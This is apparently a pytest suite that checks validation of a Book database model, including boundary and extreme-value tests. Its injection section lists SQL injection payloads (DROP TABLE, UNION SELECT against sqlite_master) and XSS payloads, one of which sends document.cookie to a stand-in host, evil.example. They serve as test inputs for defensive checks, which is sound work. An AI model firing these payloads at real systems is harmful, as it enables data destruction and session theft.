"""
Extended unit-test scenario for project.books.models.Book.

Groups:
  1. Valid data          - the model must accept and persist correct input unchanged.
  2. Invalid data        - the model must reject malformed input.
  3. Boundary values     - the edges of every allowed range.
  4. Extreme values      - huge numbers, huge strings, special floats, bulk inserts.
  5. Injection (SQL/JS)  - SQL payloads must be stored as inert data, JS/HTML must be rejected.

Expected business rules (derived from the column definitions and the CreateBook form):
  * name            - required, non-blank string, 1..64 chars, unique, no HTML/JS markup
  * author          - string, max 64 chars, no HTML/JS markup
  * year_published  - integer (not bool/float/str), MIN_YEAR..current year
  * book_type       - one of BOOK_TYPES
  * status          - one of STATUSES

"Rejected" means: constructing the object or committing it raises an error.
NOTE: the Book model currently has no validation, so many tests in groups 2-5 are
expected to FAIL - they document the gaps in the model, they are not wrong tests.
"""

import datetime

import pytest
from sqlalchemy import inspect
from sqlalchemy.exc import SQLAlchemyError

from project import db
from project.books.models import Book

NAME_MAX = 64
AUTHOR_MAX = 64
MIN_YEAR = 1
MAX_YEAR = datetime.date.today().year
BOOK_TYPES = ("2days", "5days", "10days")
STATUSES = ("available", "loaned")

# Any of these raised on construction or commit counts as a rejection.
REJECTED = (ValueError, TypeError, OverflowError, SQLAlchemyError)


def assert_rejected(make_book, **fields):
    with pytest.raises(REJECTED):
        make_book(**fields)


# ---------------------------------------------------------------------------
# 1. Valid data
# ---------------------------------------------------------------------------
class TestValidData:
    def test_create_book_persists_all_fields(self, make_book):
        book = make_book(name="Clean Code", author="Robert C. Martin",
                         year_published=2008, book_type="10days")
        assert book.id is not None
        assert book.name == "Clean Code"
        assert book.author == "Robert C. Martin"
        assert book.year_published == 2008
        assert book.book_type == "10days"

    def test_default_status_is_available(self, make_book):
        assert make_book().status == "available"

    @pytest.mark.parametrize("status", STATUSES)
    def test_allowed_statuses(self, make_book, status):
        assert make_book(status=status).status == status

    @pytest.mark.parametrize("book_type", BOOK_TYPES)
    def test_allowed_book_types(self, make_book, book_type):
        assert make_book(book_type=book_type).book_type == book_type

    @pytest.mark.parametrize("name, author", [
        ("Pan Tadeusz", "Adam Mickiewicz"),
        ("Zażółć gęślą jaźń", "Łukasz Żółkiewski"),
        ("Война и мир", "Лев Толстой"),
        ("ノルウェイの森", "村上春樹"),
    ])
    def test_unicode_text_is_preserved(self, make_book, name, author):
        book = make_book(name=name, author=author)
        assert (book.name, book.author) == (name, author)

    @pytest.mark.parametrize("name, author", [
        ("Head First Design Patterns", "O'Reilly"),
        ("C++ Primer", "Stanley B. Lippman"),
        ("Hitchhiker's Guide - Vol. 1", "Douglas Adams"),
    ])
    def test_legit_punctuation_is_accepted(self, make_book, name, author):
        book = make_book(name=name, author=author)
        assert (book.name, book.author) == (name, author)

    def test_author_may_be_empty(self, make_book):
        # The form does not require an author (anonymous works exist).
        assert make_book(author="").author == ""

    def test_multiple_books_get_distinct_ids(self, make_book):
        a = make_book(name="Book A")
        b = make_book(name="Book B")
        assert a.id != b.id
        assert Book.query.count() == 2

    def test_update_book(self, make_book, session):
        book = make_book()
        book.status = "loaned"
        session.commit()
        session.expire_all()
        assert session.get(Book, book.id).status == "loaned"

    def test_delete_book(self, make_book, session):
        book = make_book()
        session.delete(book)
        session.commit()
        assert Book.query.count() == 0

    def test_repr_contains_fields(self, make_book):
        text = repr(make_book(name="Dune", author="Frank Herbert", year_published=1965))
        for part in ("Dune", "Frank Herbert", "1965", "5days", "available"):
            assert part in text


# ---------------------------------------------------------------------------
# 2. Invalid data
# ---------------------------------------------------------------------------
class TestInvalidData:
    @pytest.mark.parametrize("name", [None, "", "   ", "\t\n"])
    def test_missing_or_blank_name_rejected(self, make_book, name):
        assert_rejected(make_book, name=name)

    @pytest.mark.parametrize("name", [12345, 3.14, ["list"], {"k": "v"}, b"bytes"])
    def test_non_string_name_rejected(self, make_book, name):
        assert_rejected(make_book, name=name)

    @pytest.mark.parametrize("author", [12345, ["list"], {"k": "v"}])
    def test_non_string_author_rejected(self, make_book, author):
        assert_rejected(make_book, author=author)

    @pytest.mark.parametrize("year", [None, "abc", "1999", "", 1999.5, True, False, [1999]])
    def test_non_integer_year_rejected(self, make_book, year):
        assert_rejected(make_book, year_published=year)

    @pytest.mark.parametrize("year", [-1, -2024])
    def test_negative_year_rejected(self, make_book, year):
        assert_rejected(make_book, year_published=year)

    @pytest.mark.parametrize("book_type", [None, "", "3days", "5DAYS", " 5days", "forever", 5])
    def test_unknown_book_type_rejected(self, make_book, book_type):
        assert_rejected(make_book, book_type=book_type)

    @pytest.mark.parametrize("status", [None, "", "stolen", "AVAILABLE", 1])
    def test_unknown_status_rejected(self, make_book, status):
        assert_rejected(make_book, status=status)

    def test_duplicate_name_rejected(self, make_book):
        make_book(name="Unique Title")
        assert_rejected(make_book, name="Unique Title")

    def test_missing_required_argument_rejected(self, session):
        with pytest.raises(TypeError):
            Book(name="No Year", author="Nobody", book_type="5days")


# ---------------------------------------------------------------------------
# 3. Boundary values
# ---------------------------------------------------------------------------
class TestBoundaryValues:
    def test_name_min_length_accepted(self, make_book):
        assert make_book(name="A").name == "A"

    def test_name_max_length_accepted(self, make_book):
        name = "N" * NAME_MAX
        assert make_book(name=name).name == name

    def test_name_max_length_plus_one_rejected(self, make_book):
        assert_rejected(make_book, name="N" * (NAME_MAX + 1))

    def test_author_max_length_accepted(self, make_book):
        author = "A" * AUTHOR_MAX
        assert make_book(author=author).author == author

    def test_author_max_length_plus_one_rejected(self, make_book):
        assert_rejected(make_book, author="A" * (AUTHOR_MAX + 1))

    def test_name_max_length_multibyte_accepted(self, make_book):
        # 64 characters, but 128 bytes in UTF-8 - the limit is in characters.
        name = "ż" * NAME_MAX
        assert make_book(name=name).name == name

    def test_year_min_accepted(self, make_book):
        assert make_book(year_published=MIN_YEAR).year_published == MIN_YEAR

    def test_year_min_minus_one_rejected(self, make_book):
        assert_rejected(make_book, year_published=MIN_YEAR - 1)

    def test_year_current_accepted(self, make_book):
        assert make_book(year_published=MAX_YEAR).year_published == MAX_YEAR

    def test_year_next_year_rejected(self, make_book):
        assert_rejected(make_book, year_published=MAX_YEAR + 1)

    def test_names_differing_only_by_case_are_distinct(self, make_book):
        make_book(name="dune")
        assert make_book(name="Dune").name == "Dune"


# ---------------------------------------------------------------------------
# 4. Extreme values
# ---------------------------------------------------------------------------
class TestExtremeValues:
    @pytest.mark.parametrize("year", [
        2**31 - 1,        # int32 max
        2**31,            # int32 overflow
        2**63 - 1,        # int64 max
        2**63,            # int64 overflow
        10**100,          # googol
        -(2**63),         # int64 min
        -(10**100),
    ])
    def test_huge_year_rejected(self, make_book, year):
        assert_rejected(make_book, year_published=year)

    @pytest.mark.parametrize("year", [float("inf"), float("-inf"), float("nan"), 1e308])
    def test_special_float_year_rejected(self, make_book, year):
        assert_rejected(make_book, year_published=year)

    @pytest.mark.parametrize("size", [1_000, 100_000, 1_000_000])
    def test_huge_name_rejected(self, make_book, size):
        assert_rejected(make_book, name="X" * size)

    def test_huge_author_rejected(self, make_book):
        assert_rejected(make_book, author="Y" * 1_000_000)

    @pytest.mark.parametrize("name", ["\x00", "Book\x00Title", "\x1b[31mred\x1b[0m", "‮evil"])
    def test_control_characters_in_name_rejected(self, make_book, name):
        assert_rejected(make_book, name=name)

    def test_emoji_name_accepted(self, make_book):
        name = "📚 Library 🐍"
        assert make_book(name=name).name == name

    def test_bulk_insert_many_books(self, session):
        count = 5_000
        session.add_all(
            Book(name=f"Book {i}", author="Bulk Author", year_published=2000, book_type="2days")
            for i in range(count)
        )
        session.commit()
        assert Book.query.count() == count


# ---------------------------------------------------------------------------
# 5. Injection attempts (SQL / JavaScript)
# ---------------------------------------------------------------------------
SQL_PAYLOADS = [
    "'; DROP TABLE books; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "1; DELETE FROM books",
    "\" OR \"\"=\"",
    "' UNION SELECT name, sql FROM sqlite_master --",
    "Robert'); DROP TABLE books;--",
]

XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "<svg onload=alert(document.cookie)>",
    "\"><script>fetch('//evil.example/'+document.cookie)</script>",
    "javascript:alert(1)",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "<body onload=alert(1)>",
]


class TestSqlInjection:
    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    @pytest.mark.parametrize("field", ["name", "author"])
    def test_sql_payload_is_stored_as_inert_text(self, make_book, payload, field):
        make_book(name="Existing Book")
        book = make_book(**{"name": "Other", field: payload})

        # The payload is stored literally and the database is intact.
        assert getattr(book, field) == payload
        assert "books" in inspect(db.engine).get_table_names()
        assert Book.query.count() == 2

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_in_filter_matches_nothing(self, make_book, payload):
        make_book(name="Secret Book")
        assert Book.query.filter_by(name=payload).all() == []
        assert Book.query.count() == 1

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_in_year_rejected(self, make_book, payload):
        assert_rejected(make_book, year_published=payload)

    @pytest.mark.parametrize("payload", SQL_PAYLOADS)
    def test_sql_payload_in_book_type_rejected(self, make_book, payload):
        assert_rejected(make_book, book_type=payload)


class TestJavaScriptInjection:
    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_name_rejected(self, make_book, payload):
        assert_rejected(make_book, name=payload)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_author_rejected(self, make_book, payload):
        assert_rejected(make_book, author=payload)

    @pytest.mark.parametrize("payload", XSS_PAYLOADS)
    def test_xss_in_status_rejected(self, make_book, payload):
        assert_rejected(make_book, status=payload)
